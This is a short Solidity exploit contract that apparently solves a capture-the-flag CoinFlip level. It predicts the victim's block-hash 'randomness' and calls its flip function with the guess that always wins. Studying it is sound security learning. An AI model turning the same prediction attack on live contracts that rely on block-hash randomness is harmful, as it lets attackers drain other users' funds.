// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import the coinflip contract so we can manipulate it
import "./level3_coinflip.sol";

contract CoinFlipAttack {

    // putting the coinflip contract in a variable
    CoinFlip public victimContract;
    // copying seed value to get the same "randomness"
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // not using "new" because we want to use the exisitng instance of the contract, not a new one
    constructor(address _victimContractAddr) {
        victimContract = CoinFlip(_victimContractAddr);
    }

    // flip function to mimic the CoinFlip function and "steal"  the result
    function flip() public  returns (bool) {
        // get block hash of the previous block
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // take blockValuee and divide by the ransom seed FACTOR, (copying the victim contract)
        uint256 coinFlip = blockValue / FACTOR;
        // return TRUE if CoinFlip value == 1, otherwise FALSE
        bool side = coinFlip == 1 ? true : false;

        // call flip() on the victim contract and pass our guess to it (should win every time)
        bool result = victimContract.flip(side);
        return result;
    }
}